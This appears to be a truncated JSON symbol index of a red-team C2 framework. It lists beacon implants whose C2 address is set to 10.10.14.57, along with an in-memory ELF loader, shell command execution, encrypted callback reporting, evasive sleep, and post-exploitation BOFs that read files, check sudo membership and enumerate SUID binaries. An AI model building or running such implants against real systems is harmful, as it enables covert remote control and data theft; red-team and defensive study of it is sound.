"function", "line": 36, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 39, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 44, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 48, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 51, "name": "free", "signature": "free(ips);"}, {"kind": "function", "line": 57, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "function", "line": 67, "name": "memcpy", "signature": "memcpy(full_enc, iv_out, 16);"}, {"kind": "function", "line": 73, "name": "snprintf", "signature": "snprintf(report_url, sizeof(report_url), \"%s%s\", cfg->c2.url, cfg->c2.report_uri);"}, {"kind": "function", "line": 147, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 152, "name": "fprintf", "signature": "fprintf(stderr, \"config error: %s\\n\", cfg_err);"}, {"kind": "function", "line": 163, "name": "bsb_backoff_init", "signature": "bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);"}, {"kind": "function", "line": 173, "name": "sleep", "signature": "sleep(bsb_backoff_next(&backoff));"}, {"kind": "function", "line": 200, "name": "bsb_backoff_reset", "signature": "bsb_backoff_reset(&backoff);"}, {"kind": "function", "line": 211, "name": "bsb_output_cleanup", "signature": "bsb_output_cleanup();"}, {"kind": "macro", "line": 13, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}]}, {"doc": "define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <openssl/rand.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h>  include \"beacon.h\" include \"aes.h\" include \"cJSON.h\"  define C2              \"10.10.14.57\"", "id": "beacons/v1/gopher_beacon.c", "kind": "module", "label": "gopher_beacon.c", "language": "c", "sha256": "8b35da1c9f06ba9e", "symbol_count": 65, "symbols": [{"doc": "=== ESTRUCTURAS ===", "kind": "struct", "line": 47, "name": "MemoryStruct"}, {"doc": "=== TRAMPOLINES ===", "kind": "struct", "line": 54, "name": "Trampoline"}, {"kind": "struct", "line": 62, "name": "SymbolResolver"}, {"doc": "=== CACHE DE TRAMPOLINES ===", "kind": "struct", "line": 68, "name": "TrampolineCache"}, {"kind": "function", "line": 137, "name": "__attribute__", "signature": "static void __attribute__((noinline))\ncall_bof_isolated(bof_func_t func, char* args, uintptr_t ar..."}, {"doc": "=== BEACON API ===", "kind": "function", "line": 190, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 202, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"doc": "=== CRATE TRAPOLINE ===", "kind": "function", "line": 214, "name": "create_trampoline", "signature": "static void* create_trampoline(void* target)"}, {"doc": "=== CLEAN TRAMPOLINE ===", "kind": "function", "line": 250, "name": "cleanup_trampolines", "signature": "static void cleanup_trampolines(void)"}, {"kind": "function", "line": 265, "name": "get_or_create_trampoline", "signature": "static void* get_or_create_trampoline(void* target)"}, {"doc": "=== CURL WRITE CALLBACK ===", "kind": "function", "line": 297, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"doc": "=== GOPHER REQUEST () ===", "kind": "function", "line": 314, "name": "gopher_request", "signature": "char* gopher_request(const char* host, int port, const char* selector, const char* method, const ..."}, {"doc": "=== BASE64 ===", "kind": "function", "line": 377, "name": "base64_encode", "signature": "char* base64_encode(const unsigned char* input, int len)"}, {"kind": "function", "line": 393, "name": "base64_decode", "signature": "unsigned char* base64_decode(const char* input, int* len)"}, {"doc": "=== AES CFB ===", "kind": "function", "line": 417, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 444, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"doc": "=== EXEC CMD ===", "kind": "function", "line": 475, "name": "exec_cmd", "signature": "char* exec_cmd(const char* cmd, int* out_len)"}, {"doc": "=== Función auxiliar: alinear al tamaño de página ===", "kind": "function", "line": 506, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 511, "name": "RunELF", "signature": "int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, \n           unsi..."}, {"doc": "=== GET LOCAL IPs ===", "kind": "function", "line": 893, "name": "get_local_ips", "signature": "char* get_local_ips()"}, {"doc": "=== DOWNLOAD BOF ===", "kind": "function", "line": 922, "name": "download_bof", "signature": "unsigned char* download_bof(const char* bof_selector, size_t* out_size)"}, {"doc": "=== RUN BOF AND CAPTURE ===", "kind": "function", "line": 950, "name": "run_bof_and_capture", "signature": "char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,\n                          c..."}, {"doc": "=== MAIN ===", "kind": "function", "line": 994, "name": "main", "signature": "int main()"}, {"doc": "=== TIPOS Y SÍMBOLOS FALTANTES ===", "kind": "function", "line": 60, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"doc": "CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call", "kind": "function", "line": 143, "name": "volatile", "signature": "asm volatile( // Guardar frame pointer \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" // Guardar callee-saved registers \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" //"}, {"kind": "function", "line": 193, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 197, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 208, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 221, "name": "fprintf", "signature": "fprintf(stderr, \"[!] Trampolín: mmap falló\\n\");"}, {"kind": "function", "line": 237, "name": "munmap", "signature": "munmap(code, code_size);"}, {"kind": "function", "line": 254, "name": "free", "signature": "free(g_trampolines);"}, {"kind": "function", "line": 319, "name": "fflush", "signature": "fflush(stdout);"}, {"kind": "function", "line": 326, "name": "snprintf", "signature": "snprintf(full_selector, sizeof(full_selector), \"/report/%s\", post_data);"}, {"kind": "function", "line": 345, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 350, "name": "send", "signature": "send(sockfd, req, strlen(req), 0);"}, {"kind": "function", "line": 383, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 384, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 385, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 386, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 390, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 420, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 428, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 437, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}, {"kind": "function", "line": 478, "name": "strdup", "signature": "return strdup(\"[!] Empty command\");"}, {"kind": "function", "line": 488, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 682, "name": "perror", "signature": "perror(\"calloc\");"}, {"kind": "function", "line": 878, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 912, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 914, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 918, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"doc": "memcpy(output, g_beacon_output, g_output_len); output[g_output_len] = '\\0'; out_len = g_output_len; fprintf(stderr, \"[DEBUG] run_bof_and_capture: EXIT with %d bytes\\n\", *out_len); fflush(stderr); return output; } === MAIN === int main() { /* Fuerza line-buffering en stdout/stderr para que se imprima todo en tiempo real", "kind": "function", "line": 996, "name": "setvbuf", "signature": "setvbuf(stdout, NULL, _IOLBF, 0);"}, {"kind": "function", "line": 998, "name": "printf", "signature": "printf(\"[*] Beacon starting...\\n\");"}, {"kind": "function", "line": 1001, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 1028, "name": "sleep", "signature": "sleep(6);"}, {"kind": "function", "line": 1122, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 1130, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 1133, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 1138, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 1142, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 1148, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "macro", "line": 1, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 29, "name": "C2", "signature": "#define C2"}, {"kind": "macro", "line": 31, "name": "CLIENT_ID", "signature": "#define CLIENT_ID"}, {"kind": "macro", "line": 32, "name": "MALEABLE", "signature": "#define MALEABLE"}, {"kind": "macro", "line": 33, "name": "USER_AGENTS_COUNT", "signature": "#define USER_AGENTS_COUNT"}]}, {"id": "beacons/v2/beacon.c", "kind": "module", "label": "beacon.c", "language": "c", "sha256": "f5466f27eb2a8a03", "symbol_count": 28, "symbols": [{"kind": "struct", "line": 33, "name": "peer_t"}, {"kind": "struct", "line": 40, "name": "mesh_msg_t"}, {"doc": "Mesh functions would be implemented here, but for this refactor we keep the same structure as v1 with mesh stubs. A production mesh implementation would add UDP broadcast listeners, peer * relay logic, and message deduplication.", "kind": "function", "line": 65, "name": "report_result", "signature": "static void report_result(const bsb_config_t *cfg,\n                           const char *command..."}, {"kind": "function", "line": 138, "name": "execute_command", "signature": "static char *execute_command(const bsb_config_t *cfg, const char *command)"}, {"kind": "function", "line": 187, "name": "main", "signature": "int main(void)"}, {"kind": "function", "line": 70, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 78, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 81, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 86, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 90, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 93, "name": "free", "signature": "free(ips);"}, {"kind": "function", "line": 99, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "function", "line": 109, "name": "memcpy", "signature": "memcpy(full_enc, iv_out, 16);"}, {"kind": "function", "line": 115, "name": "snprintf", "signature": "snprintf(report_url, sizeof(report_url), \"%s%s\", cfg->c2.url, cfg->c2.report_uri);"}, {"kind": "function", "line": 189, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 194, "name": "fprintf", "signature": "fprintf(stderr, \"config error: %s\\n\", cfg_err);"}, {"kind": "function", "line": 203, "name": "pthread_mutex_init", "signature": "pthread_mutex_init(&g_mesh.peers_mutex, NULL);"}, {"kind": "function", "line": 209, "name": "bsb_backoff_init", "signature": "bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);"}, {"kind": "function", "line": 219, "name": "sleep", "signature": "sleep(bsb_backoff_next(&backoff));"}, {"kind": "function", "line": 246, "name": "bsb_backoff_reset", "signature": "bsb_backoff_reset(&backoff);"}, {"kind": "function", "line": 257, "name": "bsb_output_cleanup", "signature": "bsb_output_cleanup();"}, {"kind": "function", "line": 259, "name": "pthread_mutex_destroy", "signature": "pthread_mutex_destroy(&g_mesh.peers_mutex);"}, {"kind": "macro", "line": 12, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 26, "name": "MAX_PEERS", "signature": "#define MAX_PEERS"}, {"kind": "macro", "line": 28, "name": "DISCOVERY_PORT", "signature": "#define DISCOVERY_PORT"}, {"kind": "macro", "line": 29, "name": "DISCOVERY_INTERVAL", "signature": "#define DISCOVERY_INTERVAL"}, {"kind": "macro", "line": 30, "name": "MAX_TTL", "signature": "#define MAX_TTL"}, {"kind": "macro", "line": 31, "name": "MESH_MSG_SIZE", "signature": "#define MESH_MSG_SIZE"}]}, {"id": "beacons/v3/beacon.c", "kind": "module", "label": "beacon.c", "language": "c", "sha256": "5cfa2c6000f2726a", "symbol_count": 22, "symbols": [{"kind": "function", "line": 7, "name": "infrastructure", "signature": "*\n * All shared infrastructure (HTTP client, crypto, BOF loader)\n * lives in beacon_common.c. Thi..."}, {"kind": "function", "line": 35, "name": "compute_primes", "signature": "static int compute_primes(int count)"}, {"kind": "function", "line": 45, "name": "evasive_sleep", "signature": "static void evasive_sleep(int seconds)"}, {"kind": "function", "line": 51, "name": "report_result", "signature": "static void report_result(const bsb_config_t *cfg,\n                           const char *command..."}, {"kind": "function", "line": 124, "name": "execute_command", "signature": "static char *execute_command(const bsb_config_t *cfg, const char *command)"}, {"kind": "function", "line": 173, "name": "main", "signature": "int main(void)"}, {"kind": "function", "line": 49, "name": "sleep", "signature": "sleep(seconds);"}, {"kind": "function", "line": 56, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 64, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 67, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 72, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 76, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 79, "name": "free", "signature": "free(ips);"}, {"kind": "function", "line": 85, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "function", "line": 95, "name": "memcpy", "signature": "memcpy(full_enc, iv_out, 16);"}, {"kind": "function", "line": 101, "name": "snprintf", "signature": "snprintf(report_url, sizeof(report_url), \"%s%s\", cfg->c2.url, cfg->c2.report_uri);"}, {"kind": "function", "line": 175, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 180, "name": "fprintf", "signature": "fprintf(stderr, \"config error: %s\\n\", cfg_err);"}, {"kind": "function", "line": 191, "name": "bsb_backoff_init", "signature": "bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);"}, {"kind": "function", "line": 230, "name": "bsb_backoff_reset", "signature": "bsb_backoff_reset(&backoff);"}, {"kind": "function", "line": 241, "name": "bsb_output_cleanup", "signature": "bsb_output_cleanup();"}, {"kind": "macro", "line": 12, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}]}, {"id": "bof/cat/bof.c", "kind": "module", "label": "bof.c", "language": "c", "sha256": "b5f7eebf6d6d0dec", "symbol_count": 4, "symbols": [{"doc": "bof/cat/bof.c  Read a file from disk and stream it back through the beacon.  args/alen: a NUL-terminated path string. The beacon's args parser is what usually hands us this.  Build: make bof-cat  include \"beacon_api.h\" include \"syscalls.h\"", "kind": "function", "line": 14, "name": "go", "signature": "void go(char *args, int alen)"}, {"kind": "function", "line": 17, "name": "BeaconPrintf", "signature": "BeaconPrintf(CALLBACK_OUTPUT, \"[cat] missing path argument\\n\");"}, {"kind": "function", "line": 34, "name": "BeaconOutput", "signature": "BeaconOutput(CALLBACK_OUTPUT, buffer, (int)n);"}, {"kind": "function", "line": 37, "name": "syscall1", "signature": "syscall1(SYS_close, fd);"}]}, {"doc": "readfile.c — LazyOwn RedTeam BOF (Linux/x64) gcc -c -nostdlib -fPIC -m64 -O2 cat.c -o cat.x64.o define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos", "id": "bof/cat/cat.c", "kind": "module", "label": "cat.c", "language": "c", "sha256": "563f4dfa683e58a6", "symbol_count": 13, "symbols": [{"doc": "Tipos", "kind": "type_alias", "line": 7, "name": "size_t", "signature": "typedef unsigned long size_t;"}, {"kind": "type_alias", "line": 8, "name": "ssize_t", "signature": "typedef long ssize_t;"}, {"doc": "Wrappers (copiados de tus ejemplos)", "kind": "function", "line": 21, "name": "syscall3", "signature": "static inline long syscall3(long n, long a1, long a2, long a3)"}, {"kind": "function", "line": 30, "name": "go", "signature": "void go(char *args, int alen)"}, {"doc": "Símbolos del beacon", "kind": "function", "line": 11, "name": "BeaconPrintf", "signature": "extern void BeaconPrintf(int, const char*, ...);"}, {"kind": "function", "line": 12, "name": "BeaconOutput", "signature": "extern void BeaconOutput(int, const char*, int);"}, {"kind": "function", "line": 23, "name": "volatile", "signature": "__asm__ volatile (\"syscall\" : \"=a\"(ret) : \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3) : \"rcx\", \"r11\", \"memory\" );"}, {"kind": "macro", "line": 3, "name": "NULL", "signature": "#define NULL"}, {"kind": "macro", "line": 4, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 15, "name": "SYS_openat", "signature": "#define SYS_openat"}, {"kind": "macro", "line": 16, "name": "SYS_read", "signature": "#define SYS_read"}, {"kind": "macro", "line": 17, "name": "SYS_close", "signature": "#define SYS_close"}, {"kind": "macro", "line": 18, "name": "AT_FDCWD", "signature": "#define AT_FDCWD"}]}, {"id": "bof/include/beacon_api.h", "kind": "module", "label": "beacon_api.h", "language": "h", "sha256": "07ebc962cdd880b4", "symbol_count": 14, "symbols": [{"doc": "Argument parser. BOFs that want to read structured args fill * one of these in via BeaconDataParse then pull fields out.", "kind": "struct", "line": 30, "name": "datap"}, {"kind": "function", "line": 7, "name": "go", "signature": "* * BOFs MUST export a function with this exact signature: * * void go(char *args, int alen);"}, {"kind": "function", "line": 35, "name": "BeaconDataParse", "signature": "void BeaconDataParse(datap *parser, char *buffer, int size);"}, {"kind": "function", "line": 37, "name": "BeaconDataPtr", "signature": "char *BeaconDataPtr(datap *parser, int size);"}, {"kind": "function", "line": 38, "name": "BeaconDataInt", "signature": "int BeaconDataInt(datap *parser);"}, {"kind": "function", "line": 39, "name": "BeaconDataShort", "signature": "short BeaconDataShort(datap *parser);"}, {"kind": "function", "line": 40, "name": "BeaconDataLength", "signature": "int BeaconDataLength(datap *parser);"}, {"kind": "function", "line": 41, "name": "BeaconDataExtract", "signature": "char *BeaconDataExtract(datap *parser, int *size);"}, {"kind": "function", "line": 44, "name": "buffer", "signature": "* takes a raw byte buffer (len may be 0 for strlen-style strings * but the buffer must still be NUL-terminated). */ void BeaconPrintf(int type, const char *fmt, ...);"}, {"kind": "function", "line": 47, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len);"}, {"kind": "macro", "line": 17, "name": "BSB_BOF_BEACON_API_H", "signature": "#define BSB_BOF_BEACON_API_H"}, {"kind": "macro", "line": 24, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 25, "name": "CALLBACK_ERROR", "signature": "#define CALLBACK_ERROR"}, {"kind": "macro", "line": 26, "name": "CALLBACK_OUTPUT_OEM", "signature": "#define CALLBACK_OUTPUT_OEM"}]}, {"id": "bof/include/syscalls.h", "kind": "module", "label": "syscalls.h", "language": "h", "sha256": "d02f8ee864c993a2", "symbol_count": 39, "symbols": [{"doc": "#define SYS_wait4      61 #define SYS_getuid     102 #define SYS_getgid     104 #define SYS_geteuid    107 #define SYS_getegid    108 #define SYS_getpid     39 #define SYS_getppid    110 #define SYS_getpwnam_r 124 #define SYS_getpwuid_r 168 #define SYS_openat     257 #define SYS_clone      56 /* Special fd value meaning \"current working directory\". define AT_FDCWD ((long)-100)", "kind": "function", "line": 48, "name": "syscall0", "signature": "static inline long syscall0(long n)"}, {"kind": "function", "line": 59, "name": "syscall1", "signature": "static inline long syscall1(long n, long a1)"}, {"kind": "function", "line": 70, "name": "syscall2", "signature": "static inline long syscall2(long n, long a1, long a2)"}, {"kind": "function", "line": 81, "name": "syscall3", "signature": "static inline long syscall3(long n, long a1, long a2, long a3)"}, {"kind": "function", "line": 92, "name": "syscall4", "signature": "static inline long syscall4(long n, long a1, long a2, long a3, long a4)"}, {"doc": "static inline long syscall4(long n, long a1, long a2, long a3, long a4) { long ret; register long r10 __asm__(\"r10\") = a4; __asm__ volatile ( \"syscall\" : \"=a\"(ret) : \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3), \"r\"(r10) : \"rcx\", \"r11\", \"memory\" ); return ret; } /* strlen - libc is not linked.", "kind": "function", "line": 106, "name": "bsf_strlen", "signature": "static inline size_t bsf_strlen(const char *s)"}, {"doc": ": \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3), \"r\"(r10) : \"rcx\", \"r11\", \"memory\" ); return ret; } /* strlen - libc is not linked. static inline size_t bsf_strlen(const char *s) { const char *p = s; while (*p) p++; return (size_t)(p - s); } /* strcmp - libc is not linked. Returns 0 on match.", "kind": "function", "line": 113, "name": "bsf_strcmp", "signature": "static inline int bsf_strcmp(const char *a, const char *b)"}, {"doc": "/* strlen - libc is not linked. static inline size_t bsf_strlen(const char *s) { const char *p = s; while (*p) p++; return (size_t)(p - s); } /* strcmp - libc is not linked. Returns 0 on match. static inline int bsf_strcmp(const char *a, const char *b) { while (*a && (*a == *b)) { a++; b++; } return *(const unsigned char *)a - *(const unsigned char *)b; } /* memcmp - libc is not linked.", "kind": "function", "line": 119, "name": "bsf_memcmp", "signature": "static inline int bsf_memcmp(const void *p1, const void *p2, size_t n)"}, {"kind": "function", "line": 51, "name": "volatile", "signature": "__asm__ volatile ( \"syscall\" : \"=a\"(ret) : \"a\"(n) : \"rcx\", \"r11\", \"memory\" );"}, {"kind": "macro", "line": 12, "name": "BSB_BOF_SYSCALLS_H", "signature": "#define BSB_BOF_SYSCALLS_H"}, {"kind": "macro", "line": 17, "name": "SYS_read", "signature": "#define SYS_read"}, {"kind": "macro", "line": 18, "name": "SYS_write", "signature": "#define SYS_write"}, {"kind": "macro", "line": 19, "name": "SYS_open", "signature": "#define SYS_open"}, {"kind": "macro", "line": 20, "name": "SYS_close", "signature": "#define SYS_close"}, {"kind": "macro", "line": 21, "name": "SYS_stat", "signature": "#define SYS_stat"}, {"kind": "macro", "line": 22, "name": "SYS_fstat", "signature": "#define SYS_fstat"}, {"kind": "macro", "line": 23, "name": "SYS_lseek", "signature": "#define SYS_lseek"}, {"kind": "macro", "line": 24, "name": "SYS_mmap", "signature": "#define SYS_mmap"}, {"kind": "macro", "line": 25, "name": "SYS_munmap", "signature": "#define SYS_munmap"}, {"kind": "macro", "line": 26, "name": "SYS_brk", "signature": "#define SYS_brk"}, {"kind": "macro", "line": 27, "name": "SYS_ioctl", "signature": "#define SYS_ioctl"}, {"kind": "macro", "line": 28, "name": "SYS_access", "signature": "#define SYS_access"}, {"kind": "macro", "line": 29, "name": "SYS_pipe", "signature": "#define SYS_pipe"}, {"kind": "macro", "line": 30, "name": "SYS_dup2", "signature": "#define SYS_dup2"}, {"kind": "macro", "line": 31, "name": "SYS_fork", "signature": "#define SYS_fork"}, {"kind": "macro", "line": 32, "name": "SYS_execve", "signature": "#define SYS_execve"}, {"kind": "macro", "line": 33, "name": "SYS_exit", "signature": "#define SYS_exit"}, {"kind": "macro", "line": 34, "name": "SYS_wait4", "signature": "#define SYS_wait4"}, {"kind": "macro", "line": 35, "name": "SYS_getuid", "signature": "#define SYS_getuid"}, {"kind": "macro", "line": 36, "name": "SYS_getgid", "signature": "#define SYS_getgid"}, {"kind": "macro", "line": 37, "name": "SYS_geteuid", "signature": "#define SYS_geteuid"}, {"kind": "macro", "line": 38, "name": "SYS_getegid", "signature": "#define SYS_getegid"}, {"kind": "macro", "line": 39, "name": "SYS_getpid", "signature": "#define SYS_getpid"}, {"kind": "macro", "line": 40, "name": "SYS_getppid", "signature": "#define SYS_getppid"}, {"kind": "macro", "line": 41, "name": "SYS_getpwnam_r", "signature": "#define SYS_getpwnam_r"}, {"kind": "macro", "line": 42, "name": "SYS_getpwuid_r", "signature": "#define SYS_getpwuid_r"}, {"kind": "macro", "line": 43, "name": "SYS_openat", "signature": "#define SYS_openat"}, {"kind": "macro", "line": 44, "name": "SYS_clone", "signature": "#define SYS_clone"}, {"kind": "macro", "line": 47, "name": "AT_FDCWD", "signature": "#define AT_FDCWD"}]}, {"id": "bof/is_sudo/bof.c", "kind": "module", "label": "bof.c", "language": "c", "sha256": "ca71f19b7cdb2403", "symbol_count": 5, "symbols": [{"doc": "bof/is_sudo/bof.c  Check whether the current user is in the sudo or wheel group.  Reads /etc/group, looks for the user's name in the member list of either group, and reports \"yes\" or \"no\" via BeaconOutput.  Build: make bof-is_sudo  include \"beacon_api.h\" include \"syscalls.h\"", "kind": "function", "line": 14, "name": "user_in_group", "signature": "static int user_in_group(const char *group, const char *username, char *filebuf, long filesize)"}, {"kind": "function", "line": 56, "name": "go", "signature": "void go(char *args, int alen)"}, {"kind": "function", "line": 68, "name": "BeaconPrintf", "signature": "BeaconPrintf(CALLBACK_OUTPUT, \"[is_sudo] uid=0 (root)\\n\");"}, {"kind": "function", "line": 69, "name": "BeaconOutput", "signature": "BeaconOutput(CALLBACK_OUTPUT, \"yes\", 0);"}, {"kind": "function", "line": 96, "name": "syscall1", "signature": "syscall1(SYS_close, fd);"}]}, {"doc": "is_sudo.c — LazyOwn RedTeam BOF (Linux/x64) gcc -c -nostdlib -fPIC -m64 -O2 is_sudo.c -o is_sudo.x64.o define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos", "id": "bof/is_sudo/is_sudo.c", "kind": "module", "label": "is_sudo.c", "language": "c", "sha256": "336e06f4e4c35a59", "symbol_count": 18, "symbols": [{"doc": "Tipos", "kind": "type_alias", "line": 7, "name": "size_t", "signature": "typedef unsigned long size_t;"}, {"kind": "type_alias", "line": 8, "name": "ssize_t", "signature": "typedef long ssize_t;"}, {"doc": "Wrappers", "kind": "function", "line": 23, "name": "syscall3", "signature": "static inline long syscall3(long n, long a1, long a2, long a3)"}, {"kind": "function", "line": 32, "name": "syscall1", "signature": "static inline long syscall1(long n, long a1)"}, {"doc": "strcmp mínimo (necesario para comparar strings)", "kind": "function", "line": 44, "name": "strcmp", "signature": "static int strcmp(const char *s1, const char *s2)"}, {"doc": "Obtener username desde /etc/passwd (sin libc)", "kind": "function", "line": 53, "name": "get_username_from_uid", "signature": "static int get_username_from_uid(long uid, char *buf, int buf_size)"}, {"kind": "function", "line": 108, "name": "go", "signature": "void go(char *args, int alen)"}, {"doc": "Símbolos del beacon", "kind": "function", "line": 11, "name": "BeaconPrintf", "signature": "extern void BeaconPrintf(int, const char*, ...);"}, {"kind": "function", "line": 12, "name": "BeaconOutput", "signature": "extern void BeaconOutput(int, const char*, int);"}, {"kind": "function", "line": 25, "name": "volatile", "signature": "__asm__ volatile (\"syscall\" : \"=a\"(ret) : \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3) : \"rcx\", \"r11\", \"memory\" );"}, {"kind": "macro", "line": 3, "name": "NULL", "signature": "#define NULL"}, {"kind": "macro", "line": 4, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 15, "name": "SYS_openat", "signature": "#define SYS_openat"}, {"kind": "macro", "line": 16, "name": "SYS_read", "signature": "#define SYS_read"}, {"kind": "macro", "line": 17, "name": "SYS_close", "signature": "#define SYS_close"}, {"kind": "macro", "line": 18, "name": "SYS_getuid", "signature": "#define SYS_getuid"}, {"kind": "macro", "line": 19, "name": "SYS_getpwuid_r", "signature": "#define SYS_getpwuid_r"}, {"kind": "macro", "line": 20, "name": "AT_FDCWD", "signature": "#define AT_FDCWD"}]}, {"id": "bof/suid_enum/bof.c", "kind": "module", "label": "bof.c", "language": "c", "sha256": "5b7ec03f791c475c", "symbol_count": 18, "symbols": [{"doc": "#include \"beacon_api.h\" #include \"syscalls.h\" /* getdents64 syscall number (x86_64) and the dirent layout. #define SYS_getdents64 217 #define SYS_lstat      6 /* d_type values we care about (from <dirent.h>). #define DT_UNKNOWN 0 #define DT_DIR     4 #define DT_LNK     10 /* Linux stat struct (matches the kernel ABI for x86_64).", "kind": "struct", "line": 35, "name": "linux_stat"}, {"doc": "getdents64 entry layout (kernel ABI). The d_reclen field tells * us the actual record size since names are variable length.", "kind": "struct", "line": 58, "name": "linux_dirent64"}, {"kind": "function", 